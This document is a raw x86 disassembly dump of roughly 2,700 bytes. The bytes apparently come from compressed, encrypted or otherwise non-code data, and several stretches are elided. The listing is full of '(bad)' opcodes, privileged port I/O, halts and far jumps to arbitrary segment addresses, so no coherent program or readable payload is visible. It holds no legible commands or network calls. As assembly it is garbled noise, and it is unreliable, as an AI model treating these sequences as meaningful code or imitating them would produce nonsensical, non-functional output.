  4269f8:	xchg   BYTE PTR [eax+0x4f],ah
  4269fb:	xor    cl,BYTE PTR [ecx-0x3abad9f1]
  426a01:	push   es
  426a02:	scas   al,BYTE PTR es:[edi]
  426a03:	fs pop esp
  426a05:	cwde   
  426a06:	jae    0x4269ee
  426a08:	mov    eax,0x9a4a01b2
  426a0d:	shl    BYTE PTR [eax-0x53],cl
  426a10:	dec    ecx
  426a11:	inc    esp
  426a12:	out    dx,al
  426a13:	dec    eax
  426a14:	fdivr  DWORD PTR [ecx]
  426a16:	es dec ebp
  426a18:	adc    eax,0xa65dbdc4
  426a1d:	or     BYTE PTR [ebp-0x6a],bl
  426a20:	lahf   
  426a21:	sub    BYTE PTR [ebx-0x1e5744a1],bh
  426a27:	push   ebp
  426a28:	jmp    0x2d35f958
  426a2d:	shr    BYTE PTR [eax+0x73dbf9f8],0x39
  426a34:	inc    edx
  426a35:	outs   dx,BYTE PTR ds:[esi]
  426a36:	mov    bh,0x19
  426a38:	lea    ebp,[eax-0x90e55ef]
  426a3e:	push   cs
  426a3f:	cs aam 0x8e
  426a42:	push   0x958fae0a
  426a47:	mov    al,0x9d
  426a49:	jmp    0x74b9:0xfdf56c46
  426a50:	jo     0x426aca
  426a52:	jl     0x426a7f
  426a54:	pusha  
  426a55:	inc    esp
  426a56:	pop    ebp
  426a57:	rcl    BYTE PTR [edi+eax*4],0x73
  426a5b:	inc    esi
  426a5c:	loop   0x426a80
  426a5e:	into   
  426a5f:	sub    ch,0x19
  426a62:	and    eax,0x7ef4b6f1
  426a67:	int    0xd8
  426a69:	dec    esi
  426a6a:	inc    esp
  426a6b:	dec    edi
  426a6c:	xchg   DWORD PTR [edx-0x41],edx
  426a6f:	lock sbb ebp,ebx
  426a72:	hlt    
  426a73:	inc    edi
  426a74:	sub    BYTE PTR [esi+edi*1],cl
  426a77:	push   edi
  426a78:	cmp    dl,BYTE PTR [esi]
  426a7a:	mov    eax,0xfd941096
  426a7f:	sub    al,0x2d
  426a81:	jne    0x426ab9
  426a83:	cmovs  ebx,DWORD PTR [edi]
  426a86:	dec    ebx
  426a87:	push   es
  426a88:	or     dl,dh
  426a8a:	dec    ebx
  426a8b:	push   esi
  426a8c:	(bad)  
  426a8d:	pop    edi
  426a8e:	sub    eax,0x9c10e8a1
  426a93:	sar    DWORD PTR [edx],0xbb
  426a96:	mov    ds:0x8feb3822,al
  426a9b:	call   0x167f:0xc7e84f0
  426aa2:	fucomp st(3)
  426aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426aa5:	aas    
  426aa6:	jle    0x426a3a
  426aa8:	sub    esp,DWORD PTR [eax]
  426aaa:	xchg   ebx,eax
  426aab:	leave  
  426aac:	cmp    DWORD PTR [ebx+0x6cdb5b5],ebx
  426ab2:	mov    edx,0xc2aef39c
  426ab7:	mov    bh,0x4e
  426ab9:	xchg   esi,eax
  426aba:	xor    eax,0x2c09e0e
  426abf:	adc    DWORD PTR [edx],ebp
  426ac1:	adc    eax,0x0
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	pop    edx
  426b41:	and    DWORD PTR ds:0x19c20af,esi
  426b47:	add    dh,dh
  426b49:	add    BYTE PTR [eax],al
  426b4b:	add    BYTE PTR [edx-0x1ca0b636],ch
  426b51:	push   es
  426b52:	mov    eax,ds:0xca0ccbee
  426b57:	xor    DWORD PTR [ebp+0x52],edi
  426b5a:	xchg   BYTE PTR ds:0xafeec7ac,al
  426b60:	xchg   esi,eax
  426b61:	mov    DWORD PTR [edi+0x1f],edi
  426b64:	fstp   DWORD PTR [ebx+0x36]
  426b67:	sub    DWORD PTR [edi+0x2c],ebx
  426b6a:	mov    DWORD PTR ds:0x8482df75,edx
  426b70:	sub    eax,0xb395c5b2
  426b75:	xchg   esp,eax
  426b76:	cwde   
  426b77:	xor    esp,DWORD PTR [edi]
  426b79:	addr16 popa 
  426b7b:	fs out dx,al
  426b7d:	iret   
  426b7e:	cmc    
  426b7f:	scas   al,BYTE PTR es:[edi]
  426b80:	bound  ebx,QWORD PTR [esi-0x7c3281cf]
  426b86:	aad    0x4e
  426b88:	push   0x1ed01798
  426b8d:	sbb    eax,ebx
  426b8f:	jbe    0x426b39
  426b91:	mov    ?,WORD PTR [eax-0x2a]
  426b94:	dec    ebx
  426b95:	fwait
  426b96:	bound  esi,QWORD PTR [edi]
  426b98:	(bad)  
  426b99:	xchg   ecx,eax
  426b9a:	scas   al,BYTE PTR es:[edi]
  426b9b:	mov    bl,0x82
  426b9d:	and    DWORD PTR [edx],eax
  426b9f:	or     esp,eax
  426ba1:	pop    ebp
  426ba2:	sub    al,0x57
  426ba4:	mov    bl,0x71
  426ba6:	ss jbe 0x426bc3
  426ba9:	out    dx,eax
  426baa:	pop    esp
  426bab:	xor    DWORD PTR [ebp-0x7c],edi
  426bae:	addr16 mov dl,0x63
  426bb1:	inc    ebx
  426bb2:	sub    al,0xed
  426bb4:	iret   
  426bb5:	fiadd  WORD PTR [edx-0x58]
  426bb8:	pop    esi
  426bb9:	jge    0x426be6
  426bbb:	scas   al,BYTE PTR es:[edi]
  426bbc:	mov    ebp,ebp
  426bbe:	push   ss
  426bbf:	inc    ebx
  426bc0:	sbb    BYTE PTR [ebp-0x14],cl
  426bc3:	xchg   eax,eax
  426bc5:	jl     0x426bc6
  426bc7:	mov    BYTE PTR [edx+0x2a],bl
  426bca:	ins    DWORD PTR es:[edi],dx
  426bcb:	xor    eax,0xe7bfcea0
  426bd0:	(bad)  [ecx+0x41ad2c9a]
  426bd6:	pop    edi
  426bd7:	mov    gs,WORD PTR [ebx+edi*8+0x55472f0f]
  426bde:	cld    
  426bdf:	mov    dh,0xb5
  426be1:	or     eax,0x7f773a37
  426be6:	ret    
  426be7:	repz retf 
  426be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bea:	pop    edi
  426beb:	pop    esp
  426bec:	sbb    eax,0xb
  426bef:	add    esp,DWORD PTR [ecx+0x49d537f6]
  426bf5:	pusha  
  426bf6:	sub    ebx,eax
  426bf8:	aas    
  426bf9:	xchg   ecx,eax
  426bfa:	mov    esi,0xca0253a4
  426bff:	aaa    
  426c00:	cdq    
  426c01:	sbb    DWORD PTR [ebx],eax
  426c03:	iret   
  426c04:	xchg   ecx,eax
  426c05:	pop    ebp
  426c06:	rcl    DWORD PTR [edx],0x24
  426c09:	jmp    0x8778:0xea8e0a08
  426c10:	daa    
  426c11:	mov    esp,DWORD PTR [ebp-0x53]
  426c14:	xchg   ebx,eax
  426c15:	jmp    0x426c48
  426c17:	xchg   BYTE PTR [esi],bh
  426c19:	cs jb  0x426bdf
  426c1c:	cmp    al,BYTE PTR [ebx-0x14]
  426c1f:	pop    edi
  426c20:	jg     0x426bc6
  426c22:	mov    edx,0x275d37db
  426c27:	mov    al,0x14
  426c29:	test   BYTE PTR [ebx+0x37cae788],ch
  426c2f:	retf   0xec93
  426c32:	pushf  
  426c33:	fs js  0x426c7d
  426c36:	fwait
  426c37:	ret    0x5c1b
  426c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c3b:	jl     0x426bca
  426c3d:	xchg   BYTE PTR [ecx+0x12d621],bh
	...
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	pop    eax
  426cc1:	or     BYTE PTR ds:0x19d16cd,dl
  426cc7:	add    dh,dh
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [ecx-0x11],bl
  426cce:	imul   eax,esp,0xffffffb7
  426cd1:	cs jmp 0x7a707ce4
  426cd7:	cli    
  426cd8:	jo     0x426d3f
  426cda:	aaa    
  426cdb:	inc    edi
  426cdc:	adc    al,0x4f
  426cde:	jmp    0xcb318409
  426ce3:	mov    ah,0x3
  426ce5:	push   ebp
  426ce6:	jb     0x426cc4
  426ce8:	pop    ebp
  426ce9:	clc    
  426cea:	jb     0x426d0f
  426cec:	jp     0x426cdb
  426cee:	add    cl,BYTE PTR [edx+0x1d]
  426cf1:	mov    esp,0x75db74c6
  426cf6:	add    ebp,DWORD PTR [edi+0x4a884571]
  426cfc:	int3   
  426cfd:	inc    esp
  426cfe:	sub    DWORD PTR [edi+0xa2efd09],ecx
  426d04:	jns    0x426d11
  426d06:	and    al,0x93
  426d08:	(bad)  
  426d09:	ins    DWORD PTR es:[edi],dx
  426d0a:	mov    esp,0xb264c9fa
  426d0f:	hlt    
  426d10:	out    dx,eax
  426d11:	pop    esp
  426d12:	out    dx,eax
  426d13:	adc    bh,0xf9
  426d16:	jmp    0x95af:0x374e8122
  426d1d:	push   edx
  426d1e:	iret   
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	dec    eax
  426d21:	sub    BYTE PTR [ebx+0x0],ah
  426d24:	outs   dx,DWORD PTR ds:[esi]
  426d25:	mov    edi,DWORD PTR ds:0x7910312f
  426d2b:	xchg   BYTE PTR [esi-0x15c428e2],bh
  426d31:	stos   BYTE PTR es:[edi],al
  426d32:	enter  0xd46c,0x34
  426d36:	ds jae 0x426d29
  426d39:	fs cdq 
  426d3b:	aam    0xe1
  426d3d:	(bad)  
  426d3e:	lea    edx,[ecx+0x52]
  426d41:	test   eax,0xaccc9c21
  426d46:	sar    BYTE PTR [edx],0x9
  426d49:	mov    edi,0x80d27ac0
  426d4e:	xor    ah,BYTE PTR [ebp+0xd7ee1ac]
  426d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d55:	aam    0xcb
  426d57:	in     al,0x12
  426d59:	in     eax,dx
  426d5a:	in     al,dx
  426d5b:	lods   eax,DWORD PTR ds:[esi]
  426d5c:	sub    al,0x98
  426d5e:	lock and edx,ebx
  426d61:	shl    BYTE PTR [eax+0x45970b2],1
  426d67:	lahf   
  426d68:	imul   eax,DWORD PTR [esi-0x52],0xb
  426d6c:	push   ebx
  426d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d6e:	mov    ds:0x8a31d684,al
  426d73:	shl    edi,0xed
  426d76:	mov    al,ds:0xe85aaa2c
  426d7b:	jnp    0x426d28
  426d7d:	jae    0x426d34
  426d7f:	push   ebx
  426d80:	jo     0x426d6e
  426d82:	jle    0x426db7
  426d84:	mov    ch,0x55
  426d86:	cs jno 0x426d6f
  426d89:	or     BYTE PTR [esi],al
  426d8b:	and    esp,DWORD PTR [ebp+0x7624a4d3]
  426d91:	inc    esi
  426d92:	cs pop ss
  426d94:	fst    QWORD PTR [edi]
  426d96:	iret   
  426d97:	das    
  426d98:	mov    eax,0x9438220
  426d9d:	sbb    BYTE PTR [ebx-0x31],dl
  426da0:	ret    0x8684
  426da3:	dec    eax
  426da4:	jae    0x426d6d
  426da6:	sub    al,BYTE PTR [edx]
  426da8:	xor    al,0xc4
  426daa:	rcr    DWORD PTR [edi+0x769b84bb],1
  426db0:	jmp    0x36d0:0xc7da5011
  426db7:	dec    ecx
  426db8:	jmp    0xd011f3c6
  426dbd:	lea    edi,[esp+eax*8]
  426dc0:	sub    esi,ecx
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	ja     0x426e0d
  426e42:	mov    ds:0x19e0c49,al
  426e47:	add    dh,dh
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [esi-0x689a1a3c],dh
  426e51:	aad    0xb5
  426e53:	(bad)  [ebx-0x5be3d27a]
  426e59:	jnp    0x426e8c
  426e5b:	sbb    al,BYTE PTR [ebx]
  426e5d:	inc    ebp
  426e5e:	xchg   di,ax
  426e60:	(bad)  
  426e61:	(bad)  
  426e62:	xchg   esi,eax
  426e63:	jb     0x426e28
  426e65:	mov    ebp,0x62eafbfd
  426e6a:	pop    es
  426e6b:	test   bl,al
  426e6d:	test   eax,0x7922774b
  426e72:	add    al,0x39
  426e74:	and    DWORD PTR [ebx-0x6602f871],esp
  426e7a:	jp     0x426e7c
  426e7c:	jle    0x426e5c
  426e7e:	ss push ecx
  426e80:	pop    ds
  426e81:	std    
  426e82:	icebp  
  426e83:	adc    eax,ecx
  426e85:	inc    esi
  426e86:	mov    al,ds:0xa6a9d3dd
  426e8b:	ret    0x6b53
  426e8e:	data16 cli 
  426e90:	xchg   esi,eax
  426e91:	rol    BYTE PTR [ebx-0x48],1
  426e94:	cmp    eax,0xa0e30c90
  426e99:	jo     0x426e51
  426e9b:	xor    edi,DWORD PTR [esi-0x36]
  426e9e:	shl    cl,1
  426ea0:	iret   
  426ea1:	rcr    BYTE PTR ds:0xd7afe23c,cl
  426ea7:	call   0xe8baadd9
  426eac:	xchg   edi,eax
  426ead:	in     eax,dx
  426eae:	iret   
  426eaf:	pop    eax
  426eb0:	pop    edi
  426eb1:	adc    ebp,DWORD PTR [edi+0x43]
  426eb4:	jns    0x426f21
  426eb6:	jg     0x426e3c
  426eb8:	dec    ebx
  426eb9:	pop    esi
  426eba:	ja     0x426f28
  426ebc:	mov    dl,0x10
  426ebe:	sub    DWORD PTR [edi],edx
  426ec0:	adc    bl,BYTE PTR [esi-0x2f4ded8b]
  426ec6:	fiadd  DWORD PTR [ebp-0x688c5aaf]
  426ecc:	stos   DWORD PTR es:[edi],eax
  426ecd:	inc    ebx
  426ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ecf:	iret   
  426ed0:	or     ah,BYTE PTR [edi+0x20]
  426ed3:	inc    esp
  426ed4:	xor    al,0xc6
  426ed6:	mov    cl,0xb6
  426ed8:	test   eax,0x3fa02ad9
  426edd:	jg     0x426ed4
  426edf:	enter  0x61b8,0xb5
  426ee3:	jno    0x426ed6
  426ee5:	dec    ebx
  426ee6:	sbb    eax,0xd1926b5a
  426eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eec:	pop    esi
  426eed:	arpl   dx,bp
  426eef:	mov    ebx,?
  426ef1:	xchg   edx,eax
  426ef2:	cmc    
  426ef3:	xchg   esi,eax
  426ef4:	mov    dl,bh
  426ef6:	fbstp  TBYTE PTR [ebp+0x68]
  426ef9:	aam    0x81
  426efb:	add    ch,0x5c
  426efe:	fisub  WORD PTR [edx+0x5220adcc]
  426f04:	and    eax,0xe2288a7a
  426f09:	sbb    DWORD PTR [esi+0x466047c],0x876c0b6b
  426f13:	idiv   BYTE PTR [edi]
  426f15:	pop    edi
  426f16:	cmp    al,0x6
  426f18:	nop
  426f19:	nop
  426f1a:	icebp  
  426f1b:	mov    edx,0x600512f1
  426f20:	mov    esi,ecx
  426f22:	(bad)  
  426f23:	push   ebp
  426f24:	lahf   
  426f25:	sbb    di,WORD PTR [edx-0x38]
  426f29:	repz cld 
  426f2b:	pop    ecx
  426f2c:	xchg   DWORD PTR [ebp+ecx*1-0x6d4ba385],ebx
  426f33:	test   edx,0xc99540f8
  426f39:	and    DWORD PTR [ecx-0x19],0xcab45b49
  426f40:	mov    al,0x14
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	aam    0x9c
  426fc2:	mov    dh,BYTE PTR [ebp+0x19f02]
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    BYTE PTR [edi-0x57],cl
  426fce:	and    ecx,DWORD PTR [ebp+edx*2-0x5d]
  426fd2:	jg     0x426f98
  426fd4:	adc    eax,0x3febdbf8
  426fd9:	loop   0x426fa2
  426fdb:	adc    BYTE PTR [ecx],dh
  426fdd:	scas   al,BYTE PTR es:[edi]
  426fde:	addr16 push esi
  426fe0:	and    dl,0x9f
  426fe3:	mov    DWORD PTR [eax+0x50b06752],edi
  426fe9:	cwde   
  426fea:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  426fec:	and    esi,DWORD PTR [edi+0x6eb7f31]
  426ff2:	fdiv   DWORD PTR [eax+ecx*8+0x79]
  426ff6:	ins    BYTE PTR es:[edi],dx
  426ff7:	cs pop edx
  426ff9:	xchg   esp,eax
  426ffa:	adc    eax,0x90ee89e3
  426fff:	push   ebx
  427000:	aaa    
  427001:	jp     0x427053
  427003:	mov    ecx,0x1bb1d48c
  427008:	in     eax,dx
  427009:	pop    ebx
  42700a:	ss jmp 0x732ed07e
  427010:	mov    DWORD PTR [esi-0x5beb0e13],0x4c266975
  42701a:	out    dx,eax
  42701b:	xchg   ecx,eax
  42701c:	ret    
  42701d:	cmp    cl,BYTE PTR [ebx-0x65]
  427020:	adc    ebp,DWORD PTR [eax+0x2]
  427023:	push   ebx
  427024:	lds    ebp,FWORD PTR [eax+0x62]
  427027:	push   esi
  427028:	mov    ecx,0x994a5e17
  42702d:	push   ss
  42702e:	sahf   
  42702f:	lock sar ecx,1
  427032:	sbb    cl,BYTE PTR [eax-0x43]
  427035:	enter  0xa457,0xe9
  427039:	cmp    eax,0xa44a9731
  42703e:	in     al,0x14
  427040:	and    BYTE PTR [edi],dh
  427042:	cli    
  427043:	sub    DWORD PTR [ecx],edx
  427045:	test   al,0xb4
  427047:	les    ebx,FWORD PTR [esi+esi*4+0x4ca1584f]
  42704e:	ins    BYTE PTR es:[edi],dx
  42704f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427050:	xchg   ecx,eax
  427051:	add    dl,BYTE PTR [edi-0x69]
  427054:	cli    
  427055:	mov    ss,WORD PTR [edx]
  427057:	fistp  WORD PTR ds:0x1cf3fcde
  42705d:	mov    esi,0x4c8f2526
  427062:	(bad)  
  427063:	sub    ah,BYTE PTR [ebx-0x23]
  427066:	mov    ch,0x99
  427068:	cmp    esi,esp
  42706a:	dec    ecx
  42706b:	push   cs
  42706c:	push   cs
  42706d:	push   ecx
  42706e:	fs in  eax,dx
  427070:	cmp    eax,0x79330be7
  427075:	idiv   bh
  427077:	push   0x5a
  427079:	shl    BYTE PTR [edi+0x60b3bc59],cl
  42707f:	outs   dx,BYTE PTR ds:[esi]
  427080:	fxch   st(5)
  427082:	in     eax,dx
  427083:	neg    BYTE PTR [eax-0x1f]
  427086:	jns    0x427085
  427088:	xchg   edi,eax
  427089:	xlat   BYTE PTR ds:[ebx]
  42708a:	push   0x38e948f3
  42708f:	inc    esi
  427090:	mov    ebp,0x398a05d0
  427095:	adc    BYTE PTR [eax+0x3cf84515],ah
  42709b:	xchg   esp,eax
  42709c:	and    dl,dh
  42709e:	outs   dx,DWORD PTR ds:[esi]
  42709f:	xor    al,0xaf
  4270a1:	iret   
  4270a2:	stos   DWORD PTR es:[edi],eax
  4270a3:	dec    esi
  4270a4:	adc    eax,edi
  4270a6:	xor    dl,BYTE PTR [edx]
  4270a8:	test   DWORD PTR [ebx-0x7584d618],ecx
  4270ae:	sub    bh,BYTE PTR [eax+0x3988bfac]
  4270b4:	pop    ds
  4270b5:	xchg   edi,eax
  4270b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270b7:	add    al,0x7b
  4270b9:	pop    ebp
  4270ba:	call   0xeda6:0x54f7f6bd
  4270c1:	aad    0x0
	...
  427133:	add    BYTE PTR [ebx-0x409ef0df],bl
  427139:	outs   dx,DWORD PTR ds:[esi]
  42713a:	(bad)  
  42713b:	sti    
  42713c:	into   
  42713d:	aad    0x24
  42713f:	aam    0xf2
  427141:	inc    edx
  427142:	icebp  
  427143:	jp     0x42713d
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    dl,ah
  42714d:	nop
  42714e:	loop   0x4270f8
  427150:	outs   dx,BYTE PTR ds:[esi]
  427151:	push   ebp
  427152:	test   DWORD PTR [edi+0x542380a8],ebp
  427158:	xor    al,dl
  42715a:	(bad)  
  42715b:	ss nop
  42715d:	fisttp WORD PTR [ecx+eiz*2+0x18]
  427161:	push   ebp
  427162:	in     eax,dx
  427163:	retf   0xa5fe
  427166:	mov    al,ds:0x2add8abb
  42716b:	or     edi,DWORD PTR [edi+0x6db46345]
  427171:	pop    ebx
  427172:	scas   al,BYTE PTR es:[edi]
  427173:	in     al,0x82
  427175:	sub    eax,0x1cea831d
  42717a:	inc    ebx
  42717b:	in     eax,0x50
  42717d:	cmp    eax,0x2737c8d9
  427182:	sub    DWORD PTR [eax-0x39cfbde9],eax
  427188:	(bad)  
  427189:	ret    0x81c1
  42718c:	pop    ds
  42718d:	out    0xbf,eax
  42718f:	push   edx
  427190:	xor    DWORD PTR [eax+edi*2-0x18],esi
  427194:	jp     0x427163
  427196:	lock test eax,0xc87d069d
  42719c:	repnz adc BYTE PTR [ebx-0x639bf772],0x3
  4271a4:	mov    DWORD PTR [edx],edx
  4271a6:	call   0x3b60:0xf8cf9212
  4271ad:	adc    esp,eax
  4271af:	cmp    ebx,esi
  4271b1:	push   ds
  4271b2:	fbld   TBYTE PTR [ebp-0x3a]
  4271b5:	(bad)  
  4271b6:	stc    
  4271b7:	nop
  4271b8:	hlt    
  4271b9:	scas   eax,DWORD PTR es:[edi]
  4271ba:	rol    dl,1
  4271bc:	jns    0x427163
  4271be:	push   ecx
  4271bf:	jns    0x42718f
  4271c1:	stc    
  4271c2:	loope  0x427219
  4271c4:	cmp    al,0x9d
  4271c6:	push   ss
  4271c7:	mov    esi,0xf0ba8807
  4271cc:	mov    bh,BYTE PTR [ecx+0x79ff2d81]
  4271d2:	cwde   
  4271d3:	jl     0x42723e
  4271d5:	cmp    esi,DWORD PTR [edi+0x4527e5d7]
  4271db:	lahf   
  4271dc:	pop    esp
  4271dd:	adc    eax,0x61952d2f
  4271e2:	and    esi,esp
  4271e4:	pop    edi
  4271e5:	pop    ecx
  4271e6:	and    ah,BYTE PTR cs:[esi+0x4fda2043]
  4271ed:	dec    ecx
  4271ee:	ss test al,0x29
  4271f1:	mov    eax,0xc910b763
  4271f6:	fwait
  4271f7:	popf   
  4271f8:	push   ss
  4271f9:	jo     0x4271c2
  4271fb:	rcl    BYTE PTR [edi+0x396917b],0xe2
  427202:	(bad)  
  427203:	(bad)  
  427204:	cwde   
  427205:	sub    al,0x9c
  427207:	xchg   esp,ecx
  427209:	jp     0x42724a
  42720b:	add    cl,ah
  42720d:	fs dec ebp
  42720f:	ins    DWORD PTR es:[edi],dx
  427210:	xor    BYTE PTR [edi-0x65],bh
  427213:	inc    ebx
  427214:	adc    BYTE PTR [ebx+eax*4],bl
  427217:	mov    ds:0x3be1ad75,eax
  42721c:	sub    al,0x85
  42721e:	pop    ebp
  42721f:	push   esi
  427220:	mov    ebx,DWORD PTR [edx+ebx*4-0x4a]
  427224:	add    dh,BYTE PTR [edx+0x7491f605]
  42722a:	in     al,0xe4
  42722c:	int    0xf1
  42722e:	scas   al,BYTE PTR es:[edi]
  42722f:	pop    es
  427230:	lods   eax,DWORD PTR ds:[esi]
  427231:	(bad)  
  427232:	jo     0x42721c
  427234:	adc    BYTE PTR [ebx],ch
  427236:	xor    eax,0xf6257ba7
  42723b:	(bad)  
  42723c:	hlt    
  42723d:	jmp    0x59f55eb4
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xee117229
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	pop    ds
  4272cd:	lods   eax,DWORD PTR ds:[esi]
  4272ce:	push   ebx
  4272cf:	loope  0x42731c
  4272d1:	mov    edi,0x8a5f25ea
  4272d6:	push   ebp
  4272d7:	jecxz  0x42732e
  4272d9:	sysenter 
  4272db:	rcl    BYTE PTR [eax-0x71],1
  4272de:	cmp    ebx,ecx
  4272e0:	pop    edi
  4272e1:	shr    DWORD PTR [edx],cl
  4272e3:	and    DWORD PTR [esi-0x89755c1],edi
  4272e9:	das    
  4272ea:	ror    DWORD PTR [ecx],1
  4272ec:	push   ecx
  4272ed:	scas   eax,DWORD PTR es:[edi]
  4272ee:	pop    esp
  4272ef:	pop    edi
  4272f0:	dec    ebp
  4272f1:	jmp    0xfaf6c440
  4272f6:	ins    BYTE PTR es:[edi],dx
  4272f7:	xlat   BYTE PTR ds:[ebx]
  4272f8:	or     BYTE PTR [ebx+0x64],dl
  4272fb:	inc    ebx
  4272fc:	and    DWORD PTR [eax*4-0x9837014],esi
  427303:	(bad)  
  427304:	pusha  
  427305:	mov    dl,0x26
  427307:	xchg   ebx,eax
  427308:	stos   BYTE PTR es:[edi],al
  427309:	xchg   DWORD PTR [ecx-0x4b],esi
  42730c:	adc    BYTE PTR [esi+0x29a5a817],0x64
  427313:	dec    ebp
  427314:	clc    
  427315:	ds cdq 
  427317:	cmp    BYTE PTR [edi+0xa15e593],bh
  42731d:	or     ebx,DWORD PTR [edi]
  42731f:	aaa    
  427320:	sub    ch,BYTE PTR [ebp+0x37956bad]
  427326:	jl     0x42739b
  427328:	mov    esi,ecx
  42732a:	dec    eax
  42732b:	shr    ah,1
  42732d:	mov    ebx,0x1fb34dbb
  427332:	ds push ss
  427334:	jmp    0x42736e
  427336:	xchg   ebx,eax
  427337:	adc    ebx,DWORD PTR [eax-0x4b3c5045]
  42733d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42733e:	pushf  
  42733f:	call   0x6f5681c
  427344:	xchg   edx,eax
  427345:	push   eax
  427346:	xchg   BYTE PTR [edi-0x1d],ah
  427349:	mov    ebx,0x660dc64c
  42734e:	mov    al,ds:0x8b1ef61a
  427353:	(bad)  
  427354:	fwait
  427355:	out    dx,eax
  427356:	addr16 xchg esi,eax
  427358:	addr16 js 0x427350
  42735b:	fwait
  42735c:	push   cs
  42735d:	mov    ch,0xc0
  42735f:	mov    eax,ds:0x9fdc4392
  427364:	mov    eax,ds:0xe61bbf1
  427369:	icebp  
  42736a:	loopne 0x42731e
  42736c:	add    esp,DWORD PTR [eax-0x4]
  42736f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427370:	lahf   
  427371:	jge    0x4273b3
  427373:	cld    
  427374:	(bad)  
  427375:	lds    eax,FWORD PTR ds:0x200afcef
  42737b:	fs int3 
  42737d:	mov    cl,0x21
  42737f:	mov    ds:0x3cd998ff,al
  427384:	jmp    0xfba44b20
  427389:	add    bh,cl
  42738b:	je     0x4273bf
  42738d:	pop    ss
  42738e:	test   eax,0xe6ae1606
  427393:	xchg   DWORD PTR [eax+0x75],ebp
  427396:	mov    ah,BYTE PTR [ecx-0x3c5ccabe]
  42739c:	addr16 jmp 0x42734d
  42739f:	add    DWORD PTR [ecx],ebx
  4273a1:	mov    esi,0x269f25a4
  4273a6:	pop    edx
  4273a7:	mov    DWORD PTR [edi+0x33],ebx
  4273aa:	jge    0x4273ac
  4273ac:	lahf   
  4273ad:	(bad)  
  4273ae:	xor    ebp,esp
  4273b0:	sbb    DWORD PTR [edx+0x9],ecx
  4273b3:	mov    ebp,DWORD PTR [edx+0xc97137d]
  4273b9:	or     cl,bh
  4273bb:	push   edx
  4273bc:	bnd jb 0x4273fd
  4273bf:	rcr    DWORD PTR [eax+0xa6],1
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa1e4:0xfefd2c05
  427446:	add    DWORD PTR [eax],eax
  427448:	test   BYTE PTR [eax],0x0
  42744b:	add    BYTE PTR [ebp+0x23d5688c],bl
  427451:	inc    esi
  427452:	xor    eax,esi
  427454:	js     0x42742d
  427456:	(bad)  
  427457:	sub    dh,dl
  427459:	and    BYTE PTR [ebx+0x6f],0x36
  42745d:	mov    eax,ebx
  42745f:	inc    eax
  427460:	or     eax,0xb8008676
  427465:	sahf   
  427466:	xchg   ecx,eax
  427467:	inc    ebx
  427468:	or     al,0x53
  42746a:	xchg   ebp,eax
  42746b:	in     al,0x82
  42746d:	rcr    al,1
  42746f:	mov    ebx,0x3556ea7b
  427474:	push   ss
  427475:	lods   al,BYTE PTR ds:[esi]
  427476:	data16 mov ds:0xd3c8f1d4,ax
  42747d:	test   eax,0x58c7e94c
  427482:	xor    al,0x52
  427484:	sahf   
  427485:	mov    cl,0x2e
  427487:	cmp    eax,0xfa76506a
  42748c:	lods   al,BYTE PTR ds:[esi]
  42748d:	and    BYTE PTR [esi+0x2f],ch
  427490:	rol    DWORD PTR [ebx-0x2d],1
  427493:	loope  0x427477
  427495:	xchg   ecx,eax
  427496:	scas   eax,DWORD PTR es:[edi]
  427497:	int    0xf2
  427499:	xchg   ebx,eax
  42749a:	cmp    al,0x79
  42749c:	or     esi,ebp
  42749e:	push   0x849d05b
  4274a3:	mov    dh,0x8d
  4274a5:	add    ebp,DWORD PTR [edi-0x18]
  4274a8:	(bad)  
  4274a9:	pop    ecx
  4274aa:	xchg   esi,eax
  4274ab:	mov    esp,tr7
  4274ae:	popf   
  4274af:	inc    esi
  4274b0:	mov    al,0xdd
  4274b2:	inc    ecx
  4274b3:	jb     0x4274fb
